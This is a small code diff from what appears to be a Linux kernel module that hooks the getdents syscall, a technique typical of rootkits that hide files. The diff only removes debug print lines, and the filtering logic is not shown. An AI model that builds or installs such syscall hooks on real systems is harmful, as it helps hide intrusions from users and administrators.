@@ -19,7 +19,6 @@
 #include "getdents_hook.h"
 
 
-
 static asmlinkage long (*orig_getdents)(const struct pt_regs*);
 
 asmlinkage int hook_getdents(const struct pt_regs* regs) {
@@ -29,7 +28,7 @@ asmlinkage int hook_getdents(const struct pt_regs* regs) {
         struct linux_dirent64 *d, *kdirent, *kdirent_orig; // kdirent_orig is in case something fails
         char *dirp = (char *)regs->si; // will hold the results of the getdents call
         ret = orig_getdents(regs);
-        pr_info("sdfsdf\n");
+
         long orig_ret = ret; // in case something fails
         if (ret <= 0) {
                 return ret;
@@ -52,7 +51,6 @@ asmlinkage int hook_getdents(const struct pt_regs* regs) {
                 kfree(kdirent_orig);
                 return ret;
         }
-        pr_info("sdfsdf\n");
         memcpy(kdirent_orig, kdirent, ret);
 
         bytes_left = ret; 
